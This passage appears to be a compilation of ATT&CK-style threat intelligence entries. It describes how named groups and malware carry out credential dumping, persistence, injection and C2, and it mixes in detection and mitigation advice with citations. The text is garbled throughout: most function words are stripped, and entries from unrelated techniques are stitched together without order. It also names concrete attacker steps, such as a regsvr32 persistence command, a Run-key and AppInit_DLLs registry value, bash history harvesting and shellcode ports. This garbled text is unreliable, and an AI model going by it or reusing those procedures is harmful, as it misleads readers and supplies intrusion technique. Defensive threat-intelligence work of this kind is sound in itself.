2020) [Nomadic Octopus](https://attack.mitre.org/groups/G0133) executed PowerShell hidden window.(Citation: ESET Nomadic Octopus 2018)  [ThreatNeedle](https://attack.mitre.org/software/S0665) distributed malicious Word document spearphishing email.(Citation: Kaspersky ThreatNeedle Feb 2021)  [SUNBURST](https://attack.mitre.org/software/S0559) checked domain compromised host verify running real environment.(Citation: Analyzing Solorigate Dec 2020) [Mimikatz](https://attack.mitre.org/software/S0002) functionality acquire credentials Windows Credential Manager.(Citation: Delpy Mimikatz Crendential Manager) [GrimAgent](https://attack.mitre.org/software/S0632) decryption algorithm strings based Rotate (RoR) Rotate Left (RoL) functionality.(Citation: IB GrimAgent July 2021) [Penquin](https://attack.mitre.org/software/S0587) execute command code <code>do_upload</code> send files C2.(Citation: Leonardo Turla Penquin 2020) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) SMBTouch, vulnerability scanner, determine target vulnerable EternalBlue malware.(Citation: ESET BackdoorDiplomacy Jun 2021) [xCaon](https://attack.mitre.org/software/S0653) leveraged native OS function calls retrieve  victim's network adapter's  GetAdapterInfo() API.(Citation: Checkpoint IndigoZebra July 2021)  [Taidoor](https://attack.mitre.org/software/S0011) search specific files.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Zebrocy](https://attack.mitre.org/software/S0251) port 465 C2.(Citation: ESET Zebrocy Nov 2018) [PowGoop](https://attack.mitre.org/software/S1046) decrypt PowerShell scripts execution.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: CYBERCOM Iranian Intel Cyber January 2022) [PUNCHBUGGY](https://attack.mitre.org/software/S0196) delete files written disk.(Citation: FireEye Enemy FIN8 Aug 2016)(Citation: Morphisec ShellTea June 2019) [Pteranodon](https://attack.mitre.org/software/S0147) creates subdirectories <code>%Temp%\reports\%</code> copies files subdirectories. creates folder <code>C:\Users\<Username>\AppData\Roaming\Microsoft\store</code> store screenshot JPEG files.(Citation: Palo Alto Gamaredon Feb 2017) [InvisiMole](https://attack.mitre.org/software/S0260) fileless UAC bypass create elevated object escalate privileges.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) Monitor Keychain files accessed malicious credential collection. [APT12](https://attack.mitre.org/groups/G0005) [RIPTIDE](https://attack.mitre.org/software/S0003) RAT, communicates payload encrypted RC4.(Citation: Moran 2014) [APT3](https://attack.mitre.org/groups/G0022) tool dump credentials injecting lsass.exe triggering argument "dig."(Citation: Symantec Buckeye) [TrickBot](https://attack.mitre.org/software/S0266) signed downloader component.(Citation: Cyberreason Anchor December 2019) Droppers [Putter Panda](https://attack.mitre.org/groups/G0024) RC4 16-byte XOR key consisting bytes 0xA0 – 0xAF obfuscate payloads.(Citation: CrowdStrike Putter Panda) [route](https://attack.mitre.org/software/S0103) discover routing configuration information. [WellMess](https://attack.mitre.org/software/S0514) decode decrypt data received C2.(Citation: PWC WellMess July 2020)(Citation: PWC WellMess C2 August 2020)(Citation: CISA WellMess July 2020) Monitor extracted list firewalls settings/rules (ex: Azure Network Firewall CLI commands) (Citation: Cybereason Cobalt Kitty 2017) [HyperBro](https://attack.mitre.org/software/S0398) ability download additional files.(Citation: Unit42 Emissary Panda 2019) [Wizard Spider](https://attack.mitre.org/groups/G0102) acquired credentials SAM/SECURITY registry hives.(Citation: FireEye KEGTAP SINGLEMALT October 2020) [Metamorfo](https://attack.mitre.org/software/S0455) VMProtect pack protect files.(Citation: Fortinet Metamorfo Feb 2020)  [FYAnti](https://attack.mitre.org/software/S0628) ability decrypt embedded .NET module.(Citation: Securelist APT10 March 2021) [SysUpdate](https://attack.mitre.org/software/S0663) Registry key establish persistence.(Citation: Trend Micro Iron Tiger April 2021) Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. [Elise](https://attack.mitre.org/software/S0081) executes <code>net user</code> initial communication remote server.(Citation: Lotus Blossom Jun 2015) analyzing code signing certificates features adversary developers, thumbprint, algorithm used, validity period, common name, certificate authority. Malware repositories identify additional samples adversary identify patterns adversary procuring code signing certificates.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused follow-on behavior, [Code Signing](https://attack.mitre.org/techniques/T1553/002) [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004). [Olympic Destroyer](https://attack.mitre.org/software/S0365) utilizes [PsExec](https://attack.mitre.org/software/S0029) propagate network.(Citation: Talos Olympic Destroyer 2018) [TrickBot](https://attack.mitre.org/software/S0266) brute-force attack RDP rdpscanDll module.(Citation: ESET Trickbot Oct 2020)(Citation: Bitdefender Trickbot March 2020) [Sandworm Team](https://attack.mitre.org/groups/G0034) login SQL Server <code>sp_addlinkedsrvlogin</code>.(Citation: Dragos Crashoverride 2018) [TA505](https://attack.mitre.org/groups/G0092) wide variety ransomware, [Clop](https://attack.mitre.org/software/S0611), Locky, Jaff, Bart, Philadelphia, GlobeImposter, encrypt victim files demand ransom payment.(Citation: Proofpoint TA505 Sep 2017) [Pteranodon](https://attack.mitre.org/software/S0147) ability anti-detection functions identify sandbox environments.(Citation: Unit 42 Gamaredon February 2022) [Bankshot](https://attack.mitre.org/software/S0239) command-line interface execute arbitrary commands.(Citation: McAfee Bankshot)(Citation: US-CERT Bankshot Dec 2017) [Goopy](https://attack.mitre.org/software/S0477) polymorphic decryptor decrypt runtime.(Citation: Cybereason Cobalt Kitty 2017) [ZxShell](https://attack.mitre.org/software/S0412) feature create local user accounts.(Citation: Talos ZxShell Oct 2014) [Ixeshe](https://attack.mitre.org/software/S0015) collect data local system.(Citation: Trend Micro IXESHE 2012) Prevent creation network adapters possible. process monitoring monitor execution arguments msiexec.exe. Compare invocations msiexec.exe prior history arguments executed MSI files. [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors downloaded additional malware malicious scripts compromised host.(Citation: McAfee Honeybee) [OSX/Shlayer](https://attack.mitre.org/software/S0402) escalate privileges root user credentials.(Citation: Carbon Black Shlayer Feb 2019) [BlackEnergy](https://attack.mitre.org/software/S0089) component KillDisk capable deleting Windows Event Logs.(Citation: ESEST Black Energy Jan 2016) [Emotet](https://attack.mitre.org/software/S0367) cmd.exe PowerShell script. (Citation: Picus Emotet Dec 2018) [Crutch](https://attack.mitre.org/software/S0538) automatically monitor removable drives loop files.(Citation: ESET Crutch December 2020) [More_eggs](https://attack.mitre.org/software/S0284) signed binary shellcode loader signed Dynamic Link Library (DLL) create reverse shell.(Citation: Security Intelligence Eggs Aug 2019) [WastedLocker](https://attack.mitre.org/software/S0612)'s custom cryptor, CryptOne, XOR based algorithm decrypt payload.(Citation: NCC WastedLocker June 2020) Ensure proper user permissions prevent adversaries disabling modifying firewall settings. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level.  [SodaMaster](https://attack.mitre.org/software/S0627) search list running processes.(Citation: Securelist APT10 March 2021) [Industroyer](https://attack.mitre.org/software/S0604) [Tor](https://attack.mitre.org/software/S0183) nodes C2.(Citation: Dragos Crashoverride 2017) Ensure proper permissions directory access control set deny users ability write files top-level directory <code>C:</code> directories, <code>C:\Windows\</code>, reduce malicious files execution. Require executables write-protected directories. [Conficker](https://attack.mitre.org/software/S0608) terminates services security Windows.(Citation: SANS Conficker) [Squirrelwaffle](https://attack.mitre.org/software/S1030) encrypted collected data XOR-based algorithm.(Citation: ZScaler Squirrelwaffle Sep 2021) [APT29](https://attack.mitre.org/groups/G0016) abused misconfigured certificate templates impersonate admin users create additional authentication certificates.(Citation: Mandiant APT29 Trello) [Rocke](https://attack.mitre.org/groups/G0106) scripts detected uninstalled antivirus software.(Citation: Talos Rocke August 2018)(Citation: Unit 42 Rocke January 2019) Monitor API calls OpenProcess manipulate lsass.exe running domain controller [menuPass](https://attack.mitre.org/groups/G0045) searched compromised systems folders including HR, audit expense, meeting memos.(Citation: Symantec Cicada November 2020) [FIN7](https://attack.mitre.org/groups/G0046) performed C2 DNS A, OPT, TXT records.(Citation: FireEye FIN7 Aug 2018) [BLINDINGCAN](https://attack.mitre.org/software/S0520) search, read, write, move, execute files.(Citation: US-CERT BLINDINGCAN Aug 2020)(Citation: NHS BLINDINGCAN Aug 2020) [Ragnar Locker](https://attack.mitre.org/software/S0481) attempted terminate/stop processes services endpoint security products.(Citation: Sophos Ragnar 2020) [DarkVishnya](https://attack.mitre.org/groups/G0105) ports 5190 7900 shellcode listeners, 4444, 4445, 31337 shellcode C2.(Citation: Securelist DarkVishnya Dec 2018) [Bisonal](https://attack.mitre.org/software/S0268) launched cmd.exe ShellExecuteW() API function execute commands system.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020) [PLATINUM](https://attack.mitre.org/groups/G0068) methods process injection including hot patching.(Citation: PLATINUM April 2016) Ensure wired wireless traffic encrypted appropriately. practices authentication protocols, Kerberos, ensure traffic credentials protected SSL/TLS. [C0015](https://attack.mitre.org/campaigns/C0015), threat actors limited [Rclone](https://attack.mitre.org/software/S1040)'s bandwidth setting exfiltration.(Citation: DFIR Conti Bazar Nov 2021)  [TA505](https://attack.mitre.org/groups/G0092) PowerShell download execute malware reconnaissance scripts.(Citation: Proofpoint TA505 Sep 2017)(Citation: ProofPoint SettingContent-ms July 2018)(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019) [CreepySnail](https://attack.mitre.org/software/S1024) connect C2 data exfiltration.(Citation: POLONIUM June 2022) Monitor executed commands arguments collect data stored clipboard users copying applications. [Sibot](https://attack.mitre.org/software/S0589) retrieved GUID LAN connection compromised machine.(Citation: MSTIC NOBELIUM Mar 2021) Detecting software exploitation difficult depending tools available. Software exploits succeed exploited process unstable crash. Application Firewalls detect improper inputs attempting exploitation. [NETWIRE](https://attack.mitre.org/software/S0198) capture victim's screen.(Citation: McAfee Netwire Mar 2015)(Citation: FireEye NETWIRE March 2019)(Citation: Red Canary NETWIRE January 2020)(Citation: Proofpoint NETWIRE December 2020) [IceApple](https://attack.mitre.org/software/S1022) Server Variable Dumper module iterates server variables current request returns adversary.(Citation: CrowdStrike IceApple 2022) [Cyclops Blink](https://attack.mitre.org/software/S0687) ability download files target systems.(Citation: NCSC Cyclops Blink February 2022)(Citation: Trend Micro Cyclops Blink March 2022) Suspicious processes scripts spawned manner parent process ‘systemd’, parent process 1, execute ‘root’ user. (Citation: NTT Security Flagpro December 2021) [SpeakUp](https://attack.mitre.org/software/S0374) encodes second-stage payload Base64. (Citation: CheckPoint SpeakUp Feb 2019) [H1N1](https://attack.mitre.org/software/S0132) encrypts C2 traffic RC4 key.(Citation: Cisco H1N1 2) Windows 10, enable Attack Surface Reduction (ASR) rules prevent DDE attacks spawning child processes Office programs.(Citation: ASR Nov 2017)(Citation: Enigma Reviving DDE Jan 2018) [SpeakUp](https://attack.mitre.org/software/S0374) <code>arp -a</code> command. (Citation: CheckPoint SpeakUp Feb 2019) [Carberp](https://attack.mitre.org/software/S0484) NtQueryDirectoryFile ZwQueryDirectoryFile functions hide files directories.(Citation: Trusteer Carberp October 2010) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors [Rising Sun](https://attack.mitre.org/software/S0448) modular backdoor.(Citation: McAfee Sharpshooter December 2018) [ShimRat](https://attack.mitre.org/software/S0444) installed Windows service maintain persistence victim machines.(Citation: FOX-IT 2016 Mofang) [Lazarus Group](https://attack.mitre.org/groups/G0032) rgsvr32 execute custom malware.(Citation: ESET Lazarus Jun 2020) [Inception](https://attack.mitre.org/groups/G0100) ensured persistence boot setting <code>regsvr32 %path%\ctfmonrn.dll /s</code>.(Citation: Kaspersky Cloud Atlas December 2014) [Bandook](https://attack.mitre.org/software/S0234) support commands execute Python-based payloads.(Citation: CheckPoint Bandook Nov 2020) Monitor newly executed processes corrupt wipe disk data structures hard drive boot system; targeting specific critical systems network interrupt availability network resources. [Okrum](https://attack.mitre.org/software/S0439) establishes persistence creating .lnk shortcut Startup folder.(Citation: ESET Okrum July 2019)  [Maze](https://attack.mitre.org/software/S0449) “Wow64RevertWow64FsRedirection” function attempts delete shadow volumes, leave prior redirection.(Citation: McAfee Maze March 2020)	 [IcedID](https://attack.mitre.org/software/S0483) established persistence creating Registry key.(Citation: IBM IcedID November 2017) [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) ability upload files compromised host.(Citation: Trend Micro MacOS Backdoor November 2020) Perform regular firmware updates mitigate risks exploitation abuse. [Conficker](https://attack.mitre.org/software/S0608) scans machines infect.(Citation: SANS Conficker) Monitor analyze SSL/TLS traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) [Magic Hound](https://attack.mitre.org/groups/G0059) modified Registry settings security tools.(Citation: DFIR Report APT35 ProxyShell March 2022) (Citation: Cybereason PowerLess February 2022) [APT38](https://attack.mitre.org/groups/G0082) Windows API execute code victim's system.(Citation: CISA AA20-239A BeagleBoyz August 2020)  [TajMahal](https://attack.mitre.org/software/S0467) ability steal written images files connected removable drives again.(Citation: Kaspersky TajMahal April 2019) Monitor contextual data running process, include environment variables, image name, user/owner bypass UAC mechanisms elevate process privileges system. [UBoatRAT](https://attack.mitre.org/software/S0333) custom command control protocol communicate C2. string ‘488’ payload encrypts entre buffer static key simple XOR cipher.(Citation: PaloAlto UBoatRAT Nov 2017) [APT37](https://attack.mitre.org/groups/G0067) command-line interface.(Citation: FireEye APT37 Feb 2018)(Citation: Talos Group123) [TrickBot](https://attack.mitre.org/software/S0266) searches file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, .zip. browsing history, cookies, plug-in information.(Citation: S2 Grupo TrickBot June 2017)(Citation: Trend Micro Trickbot Nov 2018) Identify block malicious unmanaged COR_PROFILER profiling DLLs  application control solutions AppLocker capable auditing blocking unapproved DLLs.(Citation: Beechey 2010)(Citation: Windows Commands JPCERT)(Citation: NSA AppLocker) [Windshift](https://attack.mitre.org/groups/G0112) malware identify username compromised host.(Citation: BlackBerry Bahamut) [Remcos](https://attack.mitre.org/software/S0332) search files infected machine.(Citation: Riskiq Remcos Jan 2018) [Lokibot](https://attack.mitre.org/software/S0447) PowerShell commands embedded batch scripts.(Citation: Talos Lokibot Jan 2021)  [TEMP.Veles](https://attack.mitre.org/groups/G0088) timestomping modify $STANDARD_INFORMATION attribute tools.(Citation: FireEye TRITON 2019) Ensure privilege principles applied resources reduce exposure data manipulation risk. [ShadowPad](https://attack.mitre.org/software/S0596) injected install module newly created process.(Citation: Kaspersky ShadowPad Aug 2017) [XCSSET](https://attack.mitre.org/software/S0658) performs AES-CBC encryption files <code>~/Documents</code>, <code>~/Downloads</code>, and
<code>~/Desktop</code> fixed key renames files <code>.enc</code> extension. files sizes 
less 500MB encrypted.(Citation: trendmicro xcsset xcode project 2020) [APT41](https://attack.mitre.org/groups/G0096) tool called CLASSFON covertly proxy network communications.(Citation: FireEye APT41 Aug 2019) Disable default “hide file extensions file types” Windows OS.(Citation: Seqrite DoubleExtension)(Citation: HowToGeek ShowExtension) [BoxCaon](https://attack.mitre.org/software/S0651) collect victim's MAC address <code>GetAdaptersInfo</code> API.(Citation: Checkpoint IndigoZebra July 2021) persistence mechanism [CozyCar](https://attack.mitre.org/software/S0046) register Windows service.(Citation: F-Secure CozyDuke) (Citation: ESET Lazarus KillDisk April 2018) [Astaroth](https://attack.mitre.org/software/S0373) abuse alternate data streams (ADS) store content malicious payloads.(Citation: Securelist Brazilian Banking Malware July 2020) Monitor execution commands arguments enumeration gathering email addresses accounts <code>Get-AddressList</code>, <code>Get-GlobalAddressList</code>, <code>Get-OfflineAddressBook</code>. [MarkiRAT](https://attack.mitre.org/software/S0652) initiate communication HTTP/HTTPS C2 server.(Citation: Kaspersky Ferocious Kitten Jun 2021) Obfuscate/encrypt event files locally transit avoid feedback adversary. Monitor suspicious account behavior cloud services share account.  (Citation: CISA SoreFang July 2016) Ensure strong password (ideally 25+ characters) complexity service accounts passwords periodically expire.(Citation: AdSecurity Cracking Kerberos Dec 2015) Managed Service Accounts party product password vaulting.(Citation: AdSecurity Cracking Kerberos Dec 2015) Remove permissions create, modify, serverless resources users explicitly require them. [Bankshot](https://attack.mitre.org/software/S0239) exfiltrates data C2 channel.(Citation: McAfee Bankshot) [Suckfly](https://attack.mitre.org/groups/G0039) stolen certificates sign malware.(Citation: Symantec Suckfly March 2016) [LazyScripter](https://attack.mitre.org/groups/G0140) achieved persistence writing PowerShell script autorun registry key.(Citation: MalwareBytes LazyScripter Feb 2021) Monitor Windows logs (ex: EIDs 1341, 1342, 1020, 1063) DHCP settings. highlight DHCP issues IP allocations out.(Citation: dhcp_serv_op_events)(Citation: solution_monitor_dhcp_scopes) [POWERSTATS](https://attack.mitre.org/software/S0223) JavaScript code execution.(Citation: ClearSky MuddyWater Nov 2018) [XCSSET](https://attack.mitre.org/software/S0658) identifies macOS version <code>ioreg</code> determine serial number.(Citation: trendmicro xcsset xcode project 2020) [Crutch](https://attack.mitre.org/software/S0538) exfiltrate files compromised systems.(Citation: ESET Crutch December 2020) Monitor newly executed processes scripts automatically executed boot logon initialization establish persistence. [PoshC2](https://attack.mitre.org/software/S0378) Invoke-TokenManipulation manipulating tokens.(Citation: GitHub PoshC2) variants [Cherry Picker](https://attack.mitre.org/software/S0107) AppInit_DLLs achieve persistence creating Registry key: <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows "AppInit_DLLs"="pserver32.dll"</code>(Citation: Trustwave Cherry Picker) Monitor executed commands arguments attempt exfiltrate data physical medium, removable drive. users typically rely history commands, access history utilities "history" commands <code>cat ~/.bash_history</code>. [KillDisk](https://attack.mitre.org/software/S0607) registers service Plug-And-Play Support name.(Citation: ESET Telebots Dec 2016) [Bundlore](https://attack.mitre.org/software/S0482) AppleScript inject malicious JavaScript browser.(Citation: MacKeeper Bundlore Apr 2019) monitoring excessive <code>SendMessage</code> <code>PostMessage</code> API functions <code>LVM_SETITEMPOSITION</code> <code>LVM_GETITEMPOSITION</code> arguments.

Monitoring Windows API calls indicative types code injection generate data defense collected specific circumstances bad sequences calls, benign API functions common difficult distinguish malicious behavior. Windows API calls <code>FindWindow</code>, <code>FindWindowEx</code>, <code>EnumWindows</code>, <code>EnumChildWindows</code>, modify memory process, <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, abused technique.  [Dragonfly](https://attack.mitre.org/groups/G0035) copied installed tools operations victim environment.(Citation: US-CERT TA18-074A) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. service necessary, lock critical enclaves separate WinRM infrastructure follow WinRM practices host firewalls restrict WinRM access communication to/from specific devices.(Citation: NSA Spotting) [Machete](https://attack.mitre.org/software/S0409) written Python conjunction additional Python scripts.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: 360 Machete Sep 2020) Monitor attempts enable scripts running considered suspicious. Enumeration objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), proceed malicious use.(Citation: Fireeye Hunting June 2019)(Citation: Enigma MMC20 Jan 2017) [LookBack](https://attack.mitre.org/software/S0582) retrieve file listings victim machine.(Citation: Proofpoint LookBack Malware Aug 2019) [PlugX](https://attack.mitre.org/software/S0013) decompresses decrypts API RtlDecompressBuffer.(Citation: CIRCL PlugX March 2013)(Citation: Trend Micro DRBControl February 2020)(Citation: Proofpoint TA416 Europe March 2022) [MirageFox](https://attack.mitre.org/software/S0280) gather username victim’s machine.(Citation: APT15 Intezer June 2018) [Crimson](https://attack.mitre.org/software/S0115) ability execute commands COMSPEC environment variable.(Citation: Kaspersky Transparent Tribe August 2020) [APT28](https://attack.mitre.org/groups/G0007) deployed source tool Responder conduct NetBIOS Service poisoning, captured usernames hashed passwords allowed access legitimate credentials.(Citation: FireEye APT28)(Citation: FireEye APT28 Hospitality Aug 2017) [APT28](https://attack.mitre.org/groups/G0007) close-access teams Wi-Fi pineapples intercept Wi-Fi signals user credentials.(Citation: District Court Indictment GRU Oct 2018) [NanHaiShu](https://attack.mitre.org/software/S0228) modifies %regrun% Registry autostart mechanism.(Citation: fsecure NanHaiShu July 2016) [Ke3chang](https://attack.mitre.org/groups/G0004) developed custom malware allowed maintain persistence victim networks.(Citation: NICKEL December 2021) [UNC2452](https://attack.mitre.org/groups/G0118) service control manager remote disable services security monitoring products.(Citation: Deep Dive Solorigate January 2021) Monitor addition MiniNT registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control, disable Event Viewer.(Citation: def_ev_win_event_logging) Monitor files viewed isolation steal data exfiltrating symmetrically encrypted network protocol existing command control channel. Enforce principle least-privilege. implementing access control mechanisms include authentication authorization code repositories. multi-factor authentication. possible, enable multi-factor authentication externally facing services. [Chimera](https://attack.mitre.org/groups/G0114) tools [BloodHound](https://attack.mitre.org/software/S0521), [Cobalt Strike](https://attack.mitre.org/software/S0154), [Mimikatz](https://attack.mitre.org/software/S0002), [PsExec](https://attack.mitre.org/software/S0029).(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) Monitor executed commands arguments attempt access cached domain credentials authentication occur event domain controller unavailable.(Citation: - Cached Creds). Remote access tools built-in features incorporate existing tools Mimikatz. PowerShell scripts exist credential dumping functionality, PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) require additional logging features configured operating collect analysis.
Detection compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use adversaries well. [Lazarus Group](https://attack.mitre.org/groups/G0032) tools detect sandbox VMware services identifying presence debugger services.(Citation: ClearSky Lazarus Aug 2020) [Nltest](https://attack.mitre.org/software/S0359) enumerate remote domain controllers options <code>/dclist</code> <code>/dsgetdc</code>.(Citation: Nltest Manual) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) ability list extract data SQL databases.(Citation: ANSSI Sandworm January 2021) [BoomBox](https://attack.mitre.org/software/S0635) establish persistence writing Registry <code>MicroNativeCacheSvc</code> <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>.(Citation: MSTIC Nobelium Toolset 2021) [Tonto Team](https://attack.mitre.org/groups/G0131) delivered payloads spearphishing attachments.(Citation: TrendMicro Tonto Team October 2020) [Threat Group-3390](https://attack.mitre.org/groups/G0027) packed malware tools.(Citation: Trend Micro DRBControl February 2020) [yty](https://attack.mitre.org/software/S0248) packs plugin UPX.(Citation: ASERT Donot March 2018) Enforce principle privilege limiting dashboard visibility required users. [FatDuke](https://attack.mitre.org/software/S0512) ability execute PowerShell scripts.(Citation: ESET Dukes October 2019) [Aria-body](https://attack.mitre.org/software/S0456) ability download additional payloads C2.(Citation: CheckPoint Naikon 2020) [Molerats](https://attack.mitre.org/groups/G0021) implants, including built JS, target machines.(Citation: Kaspersky MoleRATs April 2019)	 infrastructure patterns malware, tooling, certificates, malicious content identified, internet scanning uncover adversary staged capabilities.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, initial access post-compromise behaviors. [APT41](https://attack.mitre.org/groups/G0096) hashdump, [Mimikatz](https://attack.mitre.org/software/S0002), Windows Credential Editor dump password hashes memory authenticate user accounts.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [Zeus Panda](https://attack.mitre.org/software/S0330) launch interface execute commands victim’s PC.(Citation: GDATA Zeus Panda June 2017) [GoldMax](https://attack.mitre.org/software/S0588) set execution trigger time, stored ASCII Unix/Epoch time value.(Citation: MSTIC NOBELIUM Mar 2021) [APT32](https://attack.mitre.org/groups/G0050) <code>ipconfig /all</code> command gather IP address system.(Citation: Cybereason Cobalt Kitty 2017) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors collected [Empire](https://attack.mitre.org/software/S0363), data adversary's C2.(Citation: Talos Frankenstein June 2019) [Aria-body](https://attack.mitre.org/software/S0456) ability gather metadata file search file directory names.(Citation: CheckPoint Naikon 2020) [Pisloader](https://attack.mitre.org/software/S0124) obfuscates files splitting strings sub-strings including "garbage" strings used. malware return-oriented programming (ROP) technique single-byte XOR obfuscate data.(Citation: Palo Alto DNS Requests) Applications vulnerabilities escapes setuid setgid bits set reduce potential damage application compromised. Additionally, programs setuid setgid bits set minimized system. [APT38](https://attack.mitre.org/groups/G0082) CHM files concealed payloads.(Citation: Kaspersky Lazarus Hood APR 2017) [Pony](https://attack.mitre.org/software/S0453) delivered spearphishing attachments.(Citation: Malwarebytes Pony April 2016) [RCSession](https://attack.mitre.org/software/S0662) ability TCP UDP C2 communications.(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [Ember Bear](https://attack.mitre.org/groups/G1003) extra spaces JavaScript code characters increase file size.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors custom protocol command control.(Citation: FoxIT Wocao December 2019) [EXOTIC LILY](https://attack.mitre.org/groups/G1011) gathered targeted individuals' e-mail addresses source contact forms.(Citation: Google EXOTIC LILY March 2022) [Cobalt Strike](https://attack.mitre.org/software/S0154) Base64, URL-safe Base64, NetBIOS encoding C2 traffic.(Citation: Cobalt Strike Manual 4.3 November 2020) [Goopy](https://attack.mitre.org/software/S0477) ability side-load malicious DLLs legitimate applications Kaspersky, Microsoft, Google.(Citation: Cybereason Cobalt Kitty 2017) [FIN7](https://attack.mitre.org/groups/G0046) command prompt launch commands victim’s machine.(Citation: FireEye FIN7 Aug 2018)(Citation: Flashpoint FIN 7 March 2019)  [Sidewinder](https://attack.mitre.org/groups/G0121) e-mails malicious attachments crafted specific targets.(Citation: ATT Sidewinder January 2021) [APT29](https://attack.mitre.org/groups/G0016) stolen Chrome browser cookies copying Chrome profile directories targeted users.(Citation: CrowdStrike StellarParticle January 2022) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors `smbexec.py` `psexec.py` [Impacket](https://attack.mitre.org/software/S0357) lateral movement.(Citation: FoxIT Wocao December 2019) [OLDBAIT](https://attack.mitre.org/software/S0138) C2.(Citation: FireEye APT28) [Avaddon](https://attack.mitre.org/software/S0640) encrypted strings.(Citation: Arxiv Avaddon Feb 2021) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) downloader code included "0" characters file inflate file size attempt evade anti-virus detection.(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019) [InvisiMole](https://attack.mitre.org/software/S0260) executed legitimate tools hidden windows.(Citation: ESET InvisiMole June 2020) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) capable starting process CreateProcess.(Citation: Bitdefender APT28 Dec 2015) [Mongall](https://attack.mitre.org/software/S1026) inject DLL `rundll32.exe` execution.(Citation: SentinelOne Aoqin Dragon June 2022)
 [gh0st RAT](https://attack.mitre.org/software/S0032) encrypted TCP communications evade detection.(Citation: Gh0stRAT ATT March 2019) re-locking password managers short timeout limit time plaintext credentials live memory decrypted databases. [Lazarus Group](https://attack.mitre.org/groups/G0032) rebooted systems destroying files wiping MBR infected systems.(Citation: US-CERT SHARPKNOT June 2018) [PingPull](https://attack.mitre.org/software/S1031) `cmd.exe` commands reverse shell.(Citation: Unit 42 PingPull Jun 2022) [QakBot](https://attack.mitre.org/software/S0650) ability removable drives spread compromised networks.(Citation: Trend Micro Qakbot 2020) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) masqueraded XMRIG payload naming wercplsupporte.dll legitimate wercplsupport.dll file.(Citation: RedCanary Mockingbird 2020) (Citation: Cybereason Soft Cell June 2019) technique remotely, adversary conjunction RDP. Ensure Network Level Authentication enabled force remote desktop session authenticate session created login screen displayed. enabled default Windows Vista later.(Citation: TechNet RDP NLA) [Exaramel Windows](https://attack.mitre.org/software/S0343) dropper creates starts Windows service named wsmprovav description “Windows Check AV” apparent attempt masquerade legitimate service.(Citation: ESET TeleBots Oct 2018) [ROKRAT](https://attack.mitre.org/software/S0240) `VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread` execute shellcode address space `Notepad.exe`.(Citation: Malwarebytes RokRAT VBA January 2021) [Sowbug](https://attack.mitre.org/groups/G0054) listed remote shared drives accessible victim.(Citation: Symantec Sowbug Nov 2017) [Emotet](https://attack.mitre.org/software/S0367) delivered phishing emails attachments. (Citation: CIS Emotet Apr 2017)(Citation: Malwarebytes Emotet Dec 2017)(Citation: Symantec Emotet Jul 2018)(Citation: US-CERT Emotet Jul 2018)(Citation: Talos Emotet Jan 2019)(Citation: Trend Micro Emotet Jan 2019)(Citation: Picus Emotet Dec 2018)(Citation: Carbon Black Emotet Apr 2019)(Citation: IBM IcedID November 2017) [DEATHRANSOM](https://attack.mitre.org/software/S0616) ability WMI delete volume shadow copies.(Citation: FireEye FiveHands April 2021) Monitor programs metadata modifications deletion path executable programs vulnerable type technique. Also, monitor modifications files renaming programs Windows utilities names. [Stolen Pencil](https://attack.mitre.org/groups/G0086) spearphishing emails links domains controlled threat actor.(Citation: Netscout Stolen Pencil Dec 2018) [Dragonfly](https://attack.mitre.org/groups/G0035) VPNs Outlook Access (OWA) maintain access victim networks.(Citation: US-CERT TA18-074A)(Citation: CISA AA20-296A Berserk Bear December 2020) (Citation: Symantec Orangeworm April 2018) [APT3](https://attack.mitre.org/groups/G0022) scripts startup folder persistence.(Citation: FireEye Operation Double Tap) Monitor established network communications anomalous IPs environment download malicious code. eliminate path interception weaknesses program configuration files, scripts, PATH environment variable, services, shortcuts surrounding PATH variables quotation marks functions them. aware search Windows executing loading binaries 